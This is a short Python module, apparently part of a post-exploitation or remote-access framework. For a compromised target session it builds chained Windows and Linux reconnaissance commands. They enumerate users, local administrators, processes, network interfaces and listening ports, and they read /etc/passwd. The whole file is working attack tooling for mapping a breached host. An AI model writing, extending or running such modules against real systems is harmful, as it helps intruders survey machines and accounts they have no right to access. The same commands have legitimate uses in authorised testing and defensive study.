"""
modules/sysinfo.py — System Information Gathering Module

Generates commands to collect comprehensive system information
from the target host.
"""

MODULE_INFO = {
    "name": "sysinfo",
    "description": "Collect detailed system information (OS, hardware, network)",
    "author": "Hider",
    "platform": "all",
}


def run(session, args):
    os_type = "windows"
    if session and isinstance(session, dict):
        os_type = session.get("os", "windows").lower()

    if "linux" in os_type:
        return _linux_cmd()
    return _windows_cmd()


def _windows_cmd():
    return (
        "systeminfo & "
        "ipconfig /all & "
        "net user & "
        "net localgroup administrators & "
        "tasklist /v & "
        "netstat -an"
    )


def _linux_cmd():
    return (
        "uname -a && "
        "cat /etc/os-release 2>/dev/null && "
        "ifconfig 2>/dev/null || ip addr && "
        "cat /etc/passwd && "
        "ps aux && "
        "netstat -tlnp 2>/dev/null || ss -tlnp"
    )
